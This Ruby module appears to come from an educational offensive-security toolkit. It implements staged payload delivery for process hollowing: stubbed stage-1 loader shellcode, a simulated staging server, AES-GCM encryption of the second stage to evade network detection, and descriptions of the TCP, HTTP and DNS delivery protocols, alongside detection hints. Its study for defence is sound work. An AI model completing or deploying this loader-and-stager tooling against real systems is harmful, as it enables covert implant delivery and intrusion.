# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1a -- Staged Payload Delivery
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
# DO NOT use staged payloads for unauthorized access.
#
# Implements staged payload delivery for process hollowing. In staged
# delivery, a small first-stage loader is injected into the target, which
# then fetches and executes the larger second-stage payload. This reduces
# the initial injection footprint and allows dynamic payload selection.
#
# MITRE ATT&CK: T1104 - Multi-Stage Channels
# MITRE ATT&CK: T1105 - Ingress Tool Transfer
# =============================================================================

require 'socket'
require 'openssl'
require 'securerandom'
require 'base64'

module RubyGuardian
  module ProcessHollowing
    module Payloads
      class Stager
        # Maximum stage sizes for safety bounds
        MAX_STAGE1_SIZE = 4096      # First stage should be tiny
        MAX_STAGE2_SIZE = 1_048_576 # 1MB cap for educational purposes

        # Delivery methods for second stage
        DELIVERY_METHODS = %i[tcp_connect http_get dns_txt file_read].freeze

        # Stage metadata structure
        StageInfo = Struct.new(:stage_number, :delivery_method, :data,
                               :size, :checksum, :encrypted, keyword_init: true)

        attr_reader :stages, :delivery_config

        def initialize(delivery_method: :tcp_connect, config: {})
          unless DELIVERY_METHODS.include?(delivery_method)
            raise ArgumentError, "Unknown delivery method: #{delivery_method}. " \
                                 "Valid: #{DELIVERY_METHODS.join(', ')}"
          end

          @delivery_method = delivery_method
          @delivery_config = {
            host: '127.0.0.1',
            port: 4444,
            path: '/stage2',
            encryption: true,
            verify_checksum: true,
            timeout: 10,
            retries: 3
          }.merge(config)

          @stages = []
          @encryption_key = nil
        end

        # Generate the first-stage loader shellcode.
        #
        # EDUCATIONAL: The first stage is a minimal loader that:
        #   1. Establishes a connection to the staging server
        #   2. Receives the second-stage payload size
        #   3. Allocates memory (mmap) for the second stage
        #   4. Reads the payload into the allocated region
        #   5. Jumps to the second-stage entry point
        #
        # In real attacks, stage 1 is kept as small as possible to minimize
        # detection surface. Common sizes are 200-500 bytes.
        #
        # @return [StageInfo] First stage metadata and shellcode
        def generate_stage1
          stage1 = case @delivery_method
                   when :tcp_connect then generate_tcp_stage1
                   when :http_get    then generate_http_stage1
                   when :dns_txt     then generate_dns_stage1
                   when :file_read   then generate_file_stage1
                   end

          info = StageInfo.new(
            stage_number: 1,
            delivery_method: @delivery_method,
            data: stage1,
            size: stage1.bytesize,
            checksum: checksum(stage1),
            encrypted: false
          )

          @stages << info
          info
        end

        # Prepare the second-stage payload for delivery.
        #
        # EDUCATIONAL: The second stage is the actual payload (reverse shell,
        # meterpreter, custom implant, etc.). It's prepared by:
        #   1. Optional encryption to avoid network-level detection
        #   2. Size prefix for the loader to know how much to read
        #   3. Checksum for integrity verification
        #
        # @param payload [String] Raw second-stage payload bytes
        # @param encrypt [Boolean] Whether to encrypt the stage
        # @return [StageInfo] Second stage metadata
        def prepare_stage2(payload, encrypt: true)
          if payload.bytesize > MAX_STAGE2_SIZE
            raise ArgumentError, "Stage 2 too large: #{payload.bytesize} (max: #{MAX_STAGE2_SIZE})"
          end

          prepared = payload
          key_data = nil

          if encrypt && @delivery_config[:encryption]
            prepared, key_data = encrypt_stage(payload)
            @encryption_key = key_data
          end

          # Prepend size header (4 bytes, little-endian)
          size_header = [prepared.bytesize].pack('V')

          # Append checksum (SHA256, 32 bytes)
          digest = checksum(prepared)
          packaged = size_header + prepared + [digest].pack('H*')

          info = StageInfo.new(
            stage_number: 2,
            delivery_method: @delivery_method,
            data: packaged,
            size: packaged.bytesize,
            checksum: digest,
            encrypted: encrypt
          )

          @stages << info
          info
        end

        # Simulate the staging server for educational testing.
        #
        # EDUCATIONAL: In production attacks, the staging server would be
        # a remote C2 server. For testing, we simulate it locally using
        # a TCP server that serves the second stage to any connecting loader.
        #
        # This method is INTENTIONALLY non-functional (simulation only).
        # It returns the configuration that would be used.
        #
        # @param stage2_data [String] Second stage payload to serve
        # @return [Hash] Server simulation configuration
        def simulate_staging_server(stage2_data)
          # SAFETY: We do NOT actually start a server. This returns config only.
          {
            simulation: true,
            warning: 'EDUCATIONAL SIMULATION - No actual server started',
            delivery_method: @delivery_method,
            config: @delivery_config,
            stage2_size: stage2_data.bytesize,
            stage2_checksum: checksum(stage2_data),
            would_listen_on: "#{@delivery_config[:host]}:#{@delivery_config[:port]}",
            protocol_flow: describe_protocol_flow
          }
        end

        # Generate a complete staged payload package (stage1 + stage2).
        #
        # @param final_payload [String] The actual payload to deliver
        # @return [Hash] Complete staging package
        def generate_complete_package(final_payload)
          stage1 = generate_stage1
          stage2 = prepare_stage2(final_payload)

          {
            stage1: stage1,
            stage2: stage2,
            total_size: stage1.size + stage2.size,
            delivery_method: @delivery_method,
            encryption_key: @encryption_key,
            staging_config: @delivery_config,
            protocol: describe_protocol_flow
          }
        end

        # Describe the staging protocol for educational documentation.
        def describe_protocol_flow
          case @delivery_method
          when :tcp_connect
            [
              '1. Stage1 creates TCP socket (socket syscall)',
              "2. Stage1 connects to #{@delivery_config[:host]}:#{@delivery_config[:port]}",
              '3. Server sends 4-byte size header (little-endian)',
              '4. Stage1 allocates size bytes via mmap(RWX)',
              '5. Stage1 reads payload into allocated region',
              '6. Stage1 verifies checksum (optional)',
              '7. Stage1 jumps to allocated region (payload entry)',
            ]
          when :http_get
            [
              '1. Stage1 creates TCP socket to web server',
              "2. Stage1 sends GET #{@delivery_config[:path]} HTTP/1.0",
              '3. Stage1 skips HTTP headers (reads until \\r\\n\\r\\n)',
              '4. Stage1 reads Content-Length bytes of payload',
              '5. Stage1 allocates and copies to RWX region',
              '6. Stage1 jumps to payload entry point',
            ]
          when :dns_txt
            [
              '1. Stage1 constructs DNS TXT query for staging domain',
              '2. DNS server responds with Base64-encoded payload chunks',
              '3. Stage1 reassembles and decodes chunks',
              '4. Stage1 allocates RWX memory and copies payload',
              '5. Stage1 executes payload',
            ]
          when :file_read
            [
              '1. Stage1 opens a pre-staged file on disk',
              '2. Stage1 reads the payload from the file',
              '3. Stage1 allocates RWX memory via mmap',
              '4. Stage1 copies payload and jumps to it',
              '5. Stage1 deletes the staged file (cleanup)',
            ]
          end
        end

        # Describe the overall staging technique for educational purposes.
        def describe
          <<~DESC
            Staged Payload Delivery (Educational)

            Staging separates the injection into two phases:
              Stage 1: Minimal loader (~200-500 bytes) injected into target
              Stage 2: Full payload fetched by stage 1 at runtime

            Advantages:
              - Smaller initial injection footprint
              - Stage 2 can be changed without re-exploiting
              - Stage 2 can be encrypted in transit
              - Allows environment-specific payload selection

            Disadvantages:
              - Requires network connectivity (usually)
              - Additional detection surface (network traffic)
              - More complex, more failure points

            Delivery methods: #{DELIVERY_METHODS.join(', ')}

            Detection:
              - Monitor for small processes making immediate network connections
              - Track mmap(RWX) followed by network reads
              - Inspect DNS TXT queries for encoded data patterns
              - Alert on processes reading then executing file contents
          DESC
        end

        private

        # Generate TCP reverse-connect stage 1 shellcode (x86_64 Linux).
        #
        # EDUCATIONAL: This is a simulation that returns a documented byte
        # sequence. The actual shellcode would perform:
        #   socket() -> connect() -> read(size) -> mmap(RWX) -> read(payload) -> jmp
        def generate_tcp_stage1
          host_bytes = @delivery_config[:host].split('.').map(&:to_i)
          port = @delivery_config[:port]

          # Simulated stage 1 -- documented syscall sequence, not live shellcode
          header = "STAGE1:TCP:#{@delivery_config[:host]}:#{port}"
          shellcode = []

          # mov rax, 41 (socket: AF_INET=2, SOCK_STREAM=1, 0)
          shellcode += [0x48, 0xC7, 0xC0, 0x29, 0x00, 0x00, 0x00]
          # mov rdi, 2 (AF_INET)
          shellcode += [0x48, 0xC7, 0xC7, 0x02, 0x00, 0x00, 0x00]
          # mov rsi, 1 (SOCK_STREAM)
          shellcode += [0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00]
          # xor rdx, rdx
          shellcode += [0x48, 0x31, 0xD2]
          # syscall
          shellcode += [0x0F, 0x05]
          # Followed by connect + read + mmap + jmp sequence (truncated for safety)
          # int3 (trap -- prevents accidental execution)
          shellcode += [0xCC]

          shellcode.pack('C*') + header
        end

        # Generate HTTP GET stage 1 (simulation).
        def generate_http_stage1
          header = "STAGE1:HTTP:#{@delivery_config[:host]}:#{@delivery_config[:port]}#{@delivery_config[:path]}"
          # Minimal simulation bytes + metadata
          ([0xCC] * 16).pack('C*') + header
        end

        # Generate DNS TXT stage 1 (simulation).
        def generate_dns_stage1
          header = "STAGE1:DNS:#{@delivery_config[:host]}"
          ([0xCC] * 16).pack('C*') + header
        end

        # Generate file-read stage 1 (simulation).
        def generate_file_stage1
          header = "STAGE1:FILE:#{@delivery_config.fetch(:file_path, '/tmp/.stage2')}"
          ([0xCC] * 16).pack('C*') + header
        end

        # Encrypt a stage using AES-256-GCM.
        def encrypt_stage(data)
          cipher = OpenSSL::Cipher::AES256.new(:GCM)
          cipher.encrypt

          key = cipher.random_key
          iv = cipher.random_iv
          cipher.auth_data = 'RubyGuardian-Stage'

          encrypted = cipher.update(data) + cipher.final
          tag = cipher.auth_tag

          # Package: iv(12) + tag(16) + encrypted
          packaged = iv + tag + encrypted

          [packaged, { key: key.unpack1('H*'), iv: iv.unpack1('H*') }]
        end

        # Compute SHA256 checksum of data.
        def checksum(data)
          OpenSSL::Digest::SHA256.hexdigest(data)
        end
      end
    end
  end
end
